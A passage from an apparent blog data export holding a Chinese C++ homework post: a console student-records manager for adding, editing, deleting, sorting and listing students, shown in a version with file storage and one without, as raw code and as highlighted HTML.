cout<<setiosflags(ios::fixed)<<setprecision(2)<<Boy[Maxn].Score<<endl;\n        cout<<\"-----------------------------------------------\"<<endl;\n    }\n}\nint main()\n{\n    STU S;\n    S.TITLE_STU();\n    int choice;\n    while(cin>>choice)\n    {\n        if(choice==1)S.ADD_STU();\n        else if(choice==2)S.CHANGE_STU();\n        else if(choice==3)S.DEL_STU();\n        else if(choice==4)S.SHOW_STU();\n        else if(choice==5)S.SORT_STU();\n        else if(choice==6)S.MAX_STU();\n        else if(choice==0)break;\n        system(\"PAUSE&CLS\");\n        S.TITLE_STU();\n    }\n    return 0;\n}\n```\n\n**文件操作:**\n```cpp\n#include <iostream>\n#include <cstdio>\n#include <cstring>\n#include <iomanip>\n#include <algorithm>\ntypedef long long ll;\nusing namespace std;\nint K = 0;\nclass STU\n{\nprivate:\n\tll Num;\n\tchar Name[10];\n\tchar Sex;\n\tdouble Score;\n\tbool flag;\npublic:\n\tvoid READ_STU();\n\tvoid WRITE_STU();\n\tvoid TITLE_STU();\n\tvoid ADD_STU();\n\tvoid CHANGE_STU();\n\tvoid DEL_STU();\n\tvoid SHOW_STU();\n\tvoid SORT_STU();\n\tvoid MAX_STU();\n\tfriend bool CMP1(STU, STU);\n\tfriend bool CMP2(STU, STU);\n\tfriend bool CMP3(STU, STU);\n\tSTU()\n\t{\n\t\tflag = 0;\n\t}\n\t~STU() {}\n}Boy[1000];\nvoid STU::READ_STU()\n{\n\tFILE *fp = fopen(\"STU.dat\", \"r\");\n\twhile (fscanf(fp, \"%lld %s %c %lf\", &Boy[K].Num, &Boy[K].Name, &Boy[K].Sex, &Boy[K].Score) != EOF)\n\t{\n\t\tBoy[K].flag = 0;\n\t\tK++;\n\t}\n\tfclose(fp);\n}\nvoid STU::WRITE_STU()\n{\n\tFILE *fp = fopen(\"STU.dat\", \"w\");\n\tfor (int i = 0; i < K; i++)\n\t{\n\t\tif(Boy[i].flag==0)\n\t\tfprintf(fp, \"%lld %s %c %lf\\n\", Boy[i].Num, Boy[i].Name, Boy[i].Sex, Boy[i].Score);\n\t}\n\tfclose(fp);\n}\nbool CMP1(STU a, STU b)\n{\n\treturn a.Num<b.Num;\n}\nbool CMP2(STU a, STU b)\n{\n\tif (strcmp(a.Name,b.Name)==0)\n\t\treturn a.Num<b.Num;\n\treturn strcmp(a.Name,b.Name)<0;\n}\nbool CMP3(STU a, STU b)\n{\n\tif (a.Score == b.Score)\n\t\treturn a.Num<b.Num;\n\treturn a.Score>b.Score;\n}\nvoid STU::TITLE_STU()\n{\n\tcout << \"\\t1:\\tADD A STUDENT\" << endl;\n\tcout << \"\\t2:\\tCHANGE STUDENTS\\'S INFORMATION\" << endl;\n\tcout << \"\\t3:\\tDELETE A STUDENT\" << endl;\n\tcout << \"\\t4:\\tSHOW STUDENTS INFORMATION\" << endl;\n\tcout << \"\\t5:\\tSORT THE STUDENTS\" << endl;\n\tcout << \"\\t6:\\tSHOW THE MAX SCORE\\' STUDENT\" << endl;\n\tcout << \"\\t0:\\tEXIT THE STUDENTS INFORMATION MANAGE SYSTEM\" << endl;\n\tcout << endl << \"\\tPLEASE ENTER SELECTED CHOICES FROM ABOVE LISTS\" << endl;\n}\nvoid STU::ADD_STU()\n{\n\tcout << \"请输入要添加的学生人数\" << endl;\n\tint T; cin >> T;\n\tcout << \"请输入\" << T << \"行学生的学号,姓名,性别,成绩\" << endl;\n\tfor (int i = 0; i<T; i++, K++)\n\t{\n\t\tcin >> Boy[K].Num >> Boy[K].Name >> Boy[K].Sex >> Boy[K].Score;\n\t\tBoy[K].flag = 0;\n\t}\n\tcout << endl << \"学生信息导入成功\" << endl;\n}\nvoid STU::CHANGE_STU()\n{\n\tcout << \"请输入要修改的学生学号,输入0停止删除\" << endl;\n\tll num;\n\twhile (cin >> num)\n\t{\n\t\tint flag = 0;\n\t\tfor (int i = 0; i<K; i++)\n\t\t{\n\t\t\tif (num == Boy[i].Num)\n\t\t\t{\n\t\t\t\tcout << \"请再次输入学生的学号,姓名,性别,成绩\" << endl;\n\t\t\t\tcin >> Boy[i].Num >> Boy[i].Name >> Boy[i].Sex >> Boy[i].Score;\n\t\t\t\tBoy[i].flag = 0;\n\t\t\t\tflag = 1;\n\t\t\t\tcout << \"学生信息修改成功\" << endl;\n\t\t\t}\n\t\t}\n\t\tif (num == 0)break;\n\t\tif (flag == 0)cout << \"NO SUCH STUDENTS\" << endl;\n\t}\n}\nvoid STU::DEL_STU()\n{\n\tcout << \"请输入要删除的学生学号,输入0停止删除\" << endl;\n\tll num;\n\twhile (cin >> num)\n\t{\n\t\tint flag = 0;\n\t\tfor (int i = 0; i<K; i++)\n\t\t{\n\t\t\tif (num == Boy[i].Num)\n\t\t\t{\n\t\t\t\tBoy[i].flag = 1;\n\t\t\t\tflag = 1;\n\t\t\t\tcout << \"DELETE SUCCESS!\" << endl;\n\t\t\t\tbreak;\n\t\t\t}\n\t\t}\n\t\tif (num == 0)break;\n\t\tif (flag == 0)cout << \"NO SUCH STUDENTS\" << endl;\n\t}\n}\nvoid STU::SHOW_STU()\n{\n\tcout << endl << \"\\tThe Lists Of Students Are Here\" << endl;\n\tcout << \"-----------------------------------------------\" << endl;\n\tcout << \"    学号\\t姓名\\t\\t性别\\t成绩\" << endl;\n\tcout << \"-----------------------------------------------\" << endl;\n\tcout.setf(std::ios::left);\n\tfor (int i = 0; i<K; i++)\n\t{\n\t\tif (Boy[i].flag == 0)\n\t\t{\n\t\t\tcout << Boy[i].Num << '\\t';\n\t\t\tcout << setw(8) << Boy[i].Name;\n\t\t\tcout << \"\\t \" << Boy[i].Sex << '\\t';\n\t\t\tcout << setiosflags(ios::fixed) << setprecision(2) << Boy[i].Score << endl;\n\t\t}\n\t}\n\tcout << \"-----------------------------------------------\" << endl;\n}\nvoid STU::SORT_STU()\n{\n\tint x=0;\n\tcout << \"1.按学号排序\" << endl;\n\tcout << \"2.按姓名排序\" << endl;\n\tcout << \"3.按成绩排序\" << endl << endl;;\n\tcout << \"请选择排序规则!\" << endl;\n\tcin >> x;\n\tif(x==1)sort(Boy, Boy + K, CMP1);\n\telse if(x==2)sort(Boy, Boy + K, CMP2);\n\telse if (x == 3)sort(Boy, Boy + K, CMP3);\n\telse cout << \"输入错误，排序失败\" << endl << endl;;\n\tif (x == 1 || x == 2 || x == 3)cout << \"学生信息排序成功\" << endl << endl;\n}\nvoid STU::MAX_STU()\n{\n\tint Maxn = 0, Flag = 0;\n\tfor (int i = 0; i<K; i++)\n\t{\n\t\tif (Boy[i].Score >= Boy[Maxn].Score)\n\t\t{\n\t\t\tMaxn = i;\n\t\t\tFlag = 1;\n\t\t}\n\t}\n\tif (Flag == 0)cout << \"NO STUDENT\" << endl;\n\telse\n\t{\n\t\tcout << \"-----------------------------------------------\" << endl;\n\t\tcout << \"    学号\\t姓名\\t\\t性别\\t成绩\" << endl;\n\t\tcout << \"-----------------------------------------------\" << endl;\n\t\tcout.setf(std::ios::left);\n\t\tcout << Boy[Maxn].Num << '\\t';\n\t\tcout << setw(8) << Boy[Maxn].Name;\n\t\tcout << \"\\t \" << Boy[Maxn].Sex << '\\t';\n\t\tcout << setiosflags(ios::fixed) << setprecision(2) << Boy[Maxn].Score << endl;\n\t\tcout << \"-----------------------------------------------\" << endl;\n\t}\n}\nint main()\n{\n\tSTU S;\n\tS.TITLE_STU();\n\tS.READ_STU();\n\tint choice;\n\twhile (cin >> choice)\n\t{\n\t\tif (choice == 1)S.ADD_STU();\n\t\telse if (choice == 2)S.CHANGE_STU();\n\t\telse if (choice == 3)S.DEL_STU();\n\t\telse if (choice == 4)S.SHOW_STU();\n\t\telse if (choice == 5)S.SORT_STU();\n\t\telse if (choice == 6)S.MAX_STU();\n\t\telse if (choice == 0)\n\t\t{\n\t\t\tS.WRITE_STU();\n\t\t\tbreak;\n\t\t}\n\t\tsystem(\"PAUSE&CLS\");\n\t\tS.TITLE_STU();\n\t}\n\treturn 0;\n}\n```","slug":"学生信息管理系统","published":1,"updated":"2020-05-11T09:46:11.408Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ckieexkco0037qse57cbc1gyr","content":"<blockquote>\n<p>C++课程作业</p>\n</blockquote>\n<a id=\"more\"></a>\n<p><strong>非文件操作:</strong><br><figure class=\"highlight cpp\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br><span class=\"line\">103</span><br><span class=\"line\">104</span><br><span class=\"line\">105</span><br><span class=\"line\">106</span><br><span class=\"line\">107</span><br><span class=\"line\">108</span><br><span class=\"line\">109</span><br><span class=\"line\">110</span><br><span class=\"line\">111</span><br><span class=\"line\">112</span><br><span class=\"line\">113</span><br><span class=\"line\">114</span><br><span class=\"line\">115</span><br><span class=\"line\">116</span><br><span class=\"line\">117</span><br><span class=\"line\">118</span><br><span class=\"line\">119</span><br><span class=\"line\">120</span><br><span class=\"line\">121</span><br><span class=\"line\">122</span><br><span class=\"line\">123</span><br><span class=\"line\">124</span><br><span class=\"line\">125</span><br><span class=\"line\">126</span><br><span class=\"line\">127</span><br><span class=\"line\">128</span><br><span class=\"line\">129</span><br><span class=\"line\">130</span><br><span class=\"line\">131</span><br><span class=\"line\">132</span><br><span class=\"line\">133</span><br><span class=\"line\">134</span><br><span class=\"line\">135</span><br><span class=\"line\">136</span><br><span class=\"line\">137</span><br><span class=\"line\">138</span><br><span class=\"line\">139</span><br><span class=\"line\">140</span><br><span class=\"line\">141</span><br><span class=\"line\">142</span><br><span class=\"line\">143</span><br><span class=\"line\">144</span><br><span class=\"line\">145</span><br><span class=\"line\">146</span><br><span class=\"line\">147</span><br><span class=\"line\">148</span><br><span class=\"line\">149</span><br><span class=\"line\">150</span><br><span class=\"line\">151</span><br><span class=\"line\">152</span><br><span class=\"line\">153</span><br><span class=\"line\">154</span><br><span class=\"line\">155</span><br><span class=\"line\">156</span><br><span class=\"line\">157</span><br><span class=\"line\">158</span><br><span class=\"line\">159</span><br><span class=\"line\">160</span><br><span class=\"line\">161</span><br><span class=\"line\">162</span><br><span class=\"line\">163</span><br><span class=\"line\">164</span><br><span class=\"line\">165</span><br><span class=\"line\">166</span><br><span class=\"line\">167</span><br><span class=\"line\">168</span><br><span class=\"line\">169</span><br><span class=\"line\">170</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;iostream&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;cstring&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;iomanip&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;algorithm&gt;</span></span></span><br><span class=\"line\"><span class=\"keyword\">typedef</span> <span class=\"keyword\">long</span> <span class=\"keyword\">long</span> ll;</span><br><span class=\"line\"><span class=\"keyword\">using</span> <span class=\"keyword\">namespace</span> <span class=\"built_in\">std</span>;</span><br><span class=\"line\"><span class=\"keyword\">int</span> K=<span class=\"number\">0</span>;</span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">STU</span></span></span><br><span class=\"line\"><span class=\"class\">&#123;</span></span><br><span class=\"line\"><span class=\"keyword\">private</span>:</span><br><span class=\"line\">    ll Num;</span><br><span class=\"line\">    <span class=\"keyword\">char</span> Name[<span class=\"number\">10</span>];</span><br><span class=\"line\">    <span class=\"keyword\">char</span> Sex;</span><br><span class=\"line\">    <span class=\"keyword\">double</span> Score;</span><br><span class=\"line\">    <span class=\"keyword\">bool</span> flag;</span><br><span class=\"line\"><span class=\"keyword\">public</span>:</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">void</span> <span class=\"title\">TITLE_STU</span><span class=\"params\">()</span></span>;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">void</span> <span class=\"title\">ADD_STU</span><span class=\"params\">()</span></span>;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">void</span> <span class=\"title\">CHANGE_STU</span><span class=\"params\">()</span></span>;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">void</span> <span class=\"title\">DEL_STU</span><span class=\"params\">()</span></span>;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">void</span> <span class=\"title\">SHOW_STU</span><span class=\"params\">()</span></span>;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">void</span> <span class=\"title\">SORT_STU</span><span class=\"params\">()</span></span>;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">void</span> <span class=\"title\">MAX_STU</span><span class=\"params\">()</span></span>;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">friend</span> <span class=\"keyword\">bool</span> <span class=\"title\">CMP</span><span class=\"params\">(STU,STU)</span></span>;</span><br><span class=\"line\">    STU()</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        flag=<span class=\"number\">0</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    ~STU()&#123;&#125;</span><br><span class=\"line\">&#125;Boy[<span class=\"number\">1000</span>];</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">bool</span> <span class=\"title\">CMP</span><span class=\"params\">(STU a,STU b)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (a.Score == b.Score)</span><br><span class=\"line\">\t\t<span class=\"keyword\">return</span> a.Num&lt;b.Num;</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> a.Score&gt;b.Score;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">void</span> <span class=\"title\">STU::TITLE_STU</span><span class=\"params\">()</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">    <span class=\"built_in\">cout</span>&lt;&lt;<span class=\"string\">&quot;\\t1:\\tADD A STUDENT&quot;</span>&lt;&lt;<span class=\"built_in\">endl</span>;</span><br><span class=\"line\">    <span class=\"built_in\">cout</span>&lt;&lt;<span class=\"string\">&quot;\\t2:\\tCHANGE STUDENTS\\&#x27;S INFORMATION&quot;</span>&lt;&lt;<span class=\"built_in\">endl</span>;</span><br><span class=\"line\">    <span class=\"built_in\">cout</span>&lt;&lt;<span class=\"string\">&quot;\\t3:\\tDELETE A STUDENT&quot;</span>&lt;&lt;<span class=\"built_in\">endl</span>;</span><br><span class=\"line\">    <span class=\"built_in\">cout</span>&lt;&lt;<span class=\"string\">&quot;\\t4:\\tSHOW STUDENTS INFORMATION&quot;</span>&lt;&lt;<span class=\"built_in\">endl</span>;</span><br><span class=\"line\">    <span class=\"built_in\">cout</span>&lt;&lt;<span class=\"string\">&quot;\\t5:\\tSORT BY SCORE&quot;</span>&lt;&lt;<span class=\"built_in\">endl</span>;</span><br><span class=\"line\">    <span class=\"built_in\">cout</span>&lt;&lt;<span class=\"string\">&quot;\\t6:\\tSHOW THE MAX SCORE\\&#x27; STUDENT&quot;</span>&lt;&lt;<span class=\"built_in\">endl</span>;</span><br><span class=\"line\">    <span class=\"built_in\">cout</span>&lt;&lt;<span class=\"string\">&quot;\\t0:\\tEXIT THE STUDENTS INFORMATION MANAGE SYSTEM&quot;</span>&lt;&lt;<span class=\"built_in\">endl</span>;</span><br><span class=\"line\">    <span class=\"built_in\">cout</span>&lt;&lt;<span class=\"built_in\">endl</span>&lt;&lt;<span class=\"string\">&quot;\\tPLEASE ENTER SELECTED CHOICES FROM ABOVE LISTS&quot;</span>&lt;&lt;<span class=\"built_in\">endl</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">void</span> <span class=\"title\">STU::ADD_STU</span><span class=\"params\">()</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">    <span class=\"built_in\">cout</span>&lt;&lt;<span class=\"string\">&quot;请输入要添加的学生人数&quot;</span>&lt;&lt;<span class=\"built_in\">endl</span>;</span><br><span class=\"line\">    <span class=\"keyword\">int</span> T;<span class=\"built_in\">cin</span>&gt;&gt;T;</span><br><span class=\"line\">    <span class=\"built_in\">cout</span>&lt;&lt;<span class=\"string\">&quot;请输入&quot;</span>&lt;&lt;T&lt;&lt;<span class=\"string\">&quot;行学生的学号,姓名,性别,成绩&quot;</span>&lt;&lt;<span class=\"built_in\">endl</span>;</span><br><span class=\"line\">    <span class=\"keyword\">for</span>(<span class=\"keyword\">int</span> i=<span class=\"number\">0</span>;i&lt;T;i++,K++)</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        <span class=\"built_in\">cin</span>&gt;&gt;Boy[K].Num&gt;&gt;Boy[K].Name&gt;&gt;Boy[K].Sex&gt;&gt;Boy[K].Score;</span><br><span class=\"line\">        Boy[K].flag=<span class=\"number\">0</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"built_in\">cout</span>&lt;&lt;<span class=\"built_in\">endl</span>&lt;&lt;<span class=\"string\">&quot;学生信息导入成功&quot;</span>&lt;&lt;<span class=\"built_in\">endl</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">void</span> <span class=\"title\">STU::CHANGE_STU</span><span class=\"params\">()</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">    <span class=\"built_in\">cout</span>&lt;&lt;<span class=\"string\">&quot;请输入要修改的学生学号,输入0停止删除&quot;</span>&lt;&lt;<span class=\"built_in\">endl</span>;</span><br><span class=\"line\">    ll num;</span><br><span class=\"line\">    <span class=\"keyword\">while</span>(<span class=\"built_in\">cin</span>&gt;&gt;num)</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        <span class=\"keyword\">int</span> flag=<span class=\"number\">0</span>;</span><br><span class=\"line\">        <span class=\"keyword\">for</span>(<span class=\"keyword\">int</span> i=<span class=\"number\">0</span>;i&lt;K;i++)</span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">            <span class=\"keyword\">if</span>(num==Boy[i].Num)</span><br><span class=\"line\">            &#123;</span><br><span class=\"line\">                <span class=\"built_in\">cout</span>&lt;&lt;<span class=\"string\">&quot;请再次输入学生的学号,姓名,性别,成绩&quot;</span>&lt;&lt;<span class=\"built_in\">endl</span>;</span><br><span class=\"line\">                <span class=\"built_in\">cin</span>&gt;&gt;Boy[i].Num&gt;&gt;Boy[i].Name&gt;&gt;Boy[i].Sex&gt;&gt;Boy[i].Score;</span><br><span class=\"line\">                Boy[i].flag=<span class=\"number\">0</span>;</span><br><span class=\"line\">                flag=<span class=\"number\">1</span>;</span><br><span class=\"line\">                <span class=\"built_in\">cout</span>&lt;&lt;<span class=\"string\">&quot;学生信息修改成功&quot;</span>&lt;&lt;<span class=\"built_in\">endl</span>;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"keyword\">if</span>(num==<span class=\"number\">0</span>)<span class=\"keyword\">break</span>;</span><br><span class=\"line\">        <span class=\"keyword\">if</span>(flag==<span class=\"number\">0</span>)<span class=\"built_in\">cout</span>&lt;&lt;<span class=\"string\">&quot;NO SUCH STUDENTS&quot;</span>&lt;&lt;<span class=\"built_in\">endl</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">void</span> <span class=\"title\">STU::DEL_STU</span><span class=\"params\">()</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">    <span class=\"built_in\">cout</span>&lt;&lt;<span class=\"string\">&quot;请输入要删除的学生学号,输入0停止删除&quot;</span>&lt;&lt;<span class=\"built_in\">endl</span>;</span><br><span class=\"line\">    ll num;</span><br><span class=\"line\">    <span class=\"keyword\">while</span>(<span class=\"built_in\">cin</span>&gt;&gt;num)</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        <span class=\"keyword\">int</span> flag=<span class=\"number\">0</span>;</span><br><span class=\"line\">        <span class=\"keyword\">for</span>(<span class=\"keyword\">int</span> i=<span class=\"number\">0</span>;i&lt;K;i++)</span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">            <span class=\"keyword\">if</span>(num==Boy[i].Num)</span><br><span class=\"line\">            &#123;</span><br><span class=\"line\">                Boy[i].flag=<span class=\"number\">1</span>;</span><br><span class=\"line\">                flag=<span class=\"number\">1</span>;</span><br><span class=\"line\">                <span class=\"built_in\">cout</span>&lt;&lt;<span class=\"string\">&quot;DELETE SUCCESS!&quot;</span>&lt;&lt;<span class=\"built_in\">endl</span>;</span><br><span class=\"line\">                <span class=\"keyword\">break</span>;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"keyword\">if</span>(num==<span class=\"number\">0</span>)<span class=\"keyword\">break</span>;</span><br><span class=\"line\">        <span class=\"keyword\">if</span>(flag==<span class=\"number\">0</span>)<span class=\"built_in\">cout</span>&lt;&lt;<span class=\"string\">&quot;NO SUCH STUDENTS&quot;</span>&lt;&lt;<span class=\"built_in\">endl</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">void</span> <span class=\"title\">STU::SHOW_STU</span><span class=\"params\">()</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">    <span class=\"built_in\">cout</span>&lt;&lt;<span class=\"built_in\">endl</span>&lt;&lt;<span class=\"string\">&quot;\\tThe Lists Of Students Are Here&quot;</span>&lt;&lt;<span class=\"built_in\">endl</span>;</span><br><span class=\"line\">    <span class=\"built_in\">cout</span>&lt;&lt;<span class=\"string\">&quot;-----------------------------------------------&quot;</span>&lt;&lt;<span class=\"built_in\">endl</span>;</span><br><span class=\"line\">    <span class=\"built_in\">cout</span>&lt;&lt;<span class=\"string\">&quot;    学号\\t姓名\\t\\t性别\\t成绩&quot;</span>&lt;&lt;<span class=\"built_in\">endl</span>;</span><br><span class=\"line\">    <span class=\"built_in\">cout</span>&lt;&lt;<span class=\"string\">&quot;-----------------------------------------------&quot;</span>&lt;&lt;<span class=\"built_in\">endl</span>;</span><br><span class=\"line\">    <span class=\"built_in\">cout</span>.setf(<span class=\"built_in\">std</span>::ios::left);</span><br><span class=\"line\">    <span class=\"keyword\">for</span>(<span class=\"keyword\">int</span> i=<span class=\"number\">0</span>;i&lt;K;i++)</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        <span class=\"keyword\">if</span>(Boy[i].flag==<span class=\"number\">0</span>)</span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">            <span class=\"built_in\">cout</span>&lt;&lt;Boy[i].Num&lt;&lt;<span class=\"string\">&#x27;\\t&#x27;</span>;</span><br><span class=\"line\">            <span class=\"built_in\">cout</span>&lt;&lt;setw(<span class=\"number\">8</span>)&lt;&lt;Boy[i].Name;</span><br><span class=\"line\">            <span class=\"built_in\">cout</span>&lt;&lt;<span class=\"string\">&quot;\\t &quot;</span>&lt;&lt;Boy[i].Sex&lt;&lt;<span class=\"string\">&#x27;\\t&#x27;</span>;</span><br><span class=\"line\">            <span class=\"built_in\">cout</span>&lt;&lt;setiosflags(ios::fixed)&lt;&lt;setprecision(<span class=\"number\">2</span>)&lt;&lt;Boy[i].Score&lt;&lt;<span class=\"built_in\">endl</span>;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"built_in\">cout</span>&lt;&lt;<span class=\"string\">&quot;-----------------------------------------------&quot;</span>&lt;&lt;<span class=\"built_in\">endl</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">void</span> <span class=\"title\">STU::SORT_STU</span><span class=\"params\">()</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">    sort(Boy,Boy+K,CMP);</span><br><span class=\"line\">    <span class=\"built_in\">cout</span>&lt;&lt;<span class=\"string\">&quot;学生信息排序成功&quot;</span>&lt;&lt;<span class=\"built_in\">endl</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">void</span> <span class=\"title\">STU::MAX_STU</span><span class=\"params\">()</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">int</span> Maxn=<span class=\"number\">0</span>,Flag=<span class=\"number\">0</span>;</span><br><span class=\"line\">    <span class=\"keyword\">for</span>(<span class=\"keyword\">int</span> i=<span class=\"number\">0</span>;i&lt;K;i++)</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        <span class=\"keyword\">if</span>(Boy[i].Score&gt;=Boy[Maxn].Score)</span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">            Maxn=i;</span><br><span class=\"line\">            Flag=<span class=\"number\">1</span>;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">if</span>(Flag==<span class=\"number\">0</span>)<span class=\"built_in\">cout</span>&lt;&lt;<span class=\"string\">&quot;NO STUDENT&quot;</span>&lt;&lt;<span class=\"built_in\">endl</span>;</span><br><span class=\"line\">    <span class=\"keyword\">else</span></span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        <span class=\"built_in\">cout</span>&lt;&lt;<span class=\"string\">&quot;-----------------------------------------------&quot;</span>&lt;&lt;<span class=\"built_in\">endl</span>;</span><br><span class=\"line\">        <span class=\"built_in\">cout</span>&lt;&lt;<span class=\"string\">&quot;    学号\\t姓名\\t\\t性别\\t成绩&quot;</span>&lt;&lt;<span class=\"built_in\">endl</span>;</span><br><span class=\"line\">        <span class=\"built_in\">cout</span>&lt;&lt;<span class=\"string\">&quot;-----------------------------------------------&quot;</span>&lt;&lt;<span class=\"built_in\">endl</span>;</span><br><span class=\"line\">        <span class=\"built_in\">cout</span>.setf(<span class=\"built_in\">std</span>::ios::left);</span><br><span class=\"line\">        <span class=\"built_in\">cout</span>&lt;&lt;Boy[Maxn].Num&lt;&lt;<span class=\"string\">&#x27;\\t&#x27;</span>;</span><br><span class=\"line\">        <span class=\"built_in\">cout</span>&lt;&lt;setw(<span class=\"number\">8</span>)&lt;&lt;Boy[Maxn].Name;</span><br><span class=\"line\">        <span class=\"built_in\">cout</span>&lt;&lt;<span class=\"string\">&quot;\\t &quot;</span>&lt;&lt;Boy[Maxn].Sex&lt;&lt;<span class=\"string\">&#x27;\\t&#x27;</span>;</span><br><span class=\"line\">        <span class=\"built_in\">cout</span>&lt;&lt;setiosflags(ios::fixed)&lt;&lt;setprecision(<span class=\"number\">2</span>)&lt;&lt;Boy[Maxn].Score&lt;&lt;<span class=\"built_in\">endl</span>;</span><br><span class=\"line\">        <span 